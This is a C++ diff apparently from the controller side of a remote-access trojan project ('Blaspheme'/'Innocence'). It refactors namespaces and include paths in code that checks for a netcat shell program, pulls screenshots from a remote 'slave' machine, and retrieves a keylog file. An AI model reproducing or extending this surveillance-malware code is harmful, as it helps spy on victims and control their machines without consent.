@@ -5,9 +5,9 @@
 
 #include "Slave.hpp"
 
-#include <common/Log.hpp>
+#include <log/Log.hpp>
 #include <system/File.hpp>
-#include <Innocence.hpp>
+#include <common/Innocence.hpp>
 using namespace Blaspheme;
 
 #include <string>
@@ -188,7 +188,7 @@ namespace Master
         try
         {
             // on verifie si netcat existe :
-            ifstream netcat(Innocence::SHELL_PROGRAM, std::ios::binary);
+            ifstream netcat(Common::SHELL_PROGRAM, std::ios::binary);
             if(!netcat)
             {
                 LOG << "NetCat program does not exist";
@@ -219,13 +219,13 @@ namespace Master
         try
         {
             session << GET_SCREEN;
-            LOG << "Quality : " + toString(quality);
-            session << toString(quality);
+            LOG << "Quality : " + Common::toString(quality);
+            session << Common::toString(quality);
             string buffer_photo;
             InMemoryDownload download(buffer_photo, session.stream());
             download.addObserver(new GraphicProgressBar(bar));
 			download.launch();
-			LOG << "Image size : " + toString(buffer_photo.size());
+			LOG << "Image size : " + Common::toString(buffer_photo.size());
 			if(screen.loadFromData((const unsigned char *)buffer_photo.c_str(), buffer_photo.size()))
 			{
 				LOG << "Loading OK";
@@ -234,7 +234,7 @@ namespace Master
 			{
 				LOG << "Unable to load image";
 			}
-			LOG << "Image format : " + toString(screen.width()) + "x" + toString(screen.height());
+			LOG << "Image format : " + Common::toString(screen.width()) + "x" + Common::toString(screen.height());
 		}
 		catch(Common::Exception&)
         {
@@ -370,7 +370,7 @@ namespace Master
 
     void Slave::updateKeylog(QProgressBar * bar)
     {
-        remove(Innocence::LOG_PATH_DOWNLOAD);
+        remove(Common::LOG_PATH_DOWNLOAD);
         try
         {
             string answer;
